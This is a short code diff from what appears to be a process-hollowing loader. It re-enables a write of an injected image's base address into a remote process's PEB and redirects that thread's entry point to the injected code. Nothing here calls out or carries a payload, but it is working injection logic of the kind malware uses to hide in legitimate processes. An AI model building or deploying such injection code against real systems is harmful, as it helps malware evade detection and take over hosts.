@@ -672,12 +672,12 @@ BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myP
 		return FALSE;
 	}
 
-	//status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &allocAddrOnTarget, sizeof(DWORD64), nullptr);
-	//if (status != 0)
-	//{
-	//	_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
-	//	return FALSE;
-	//}
+	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &allocAddrOnTarget, sizeof(DWORD64), nullptr);
+	if (status != 0)
+	{
+		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
+		return FALSE;
+	}
 
 	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
 
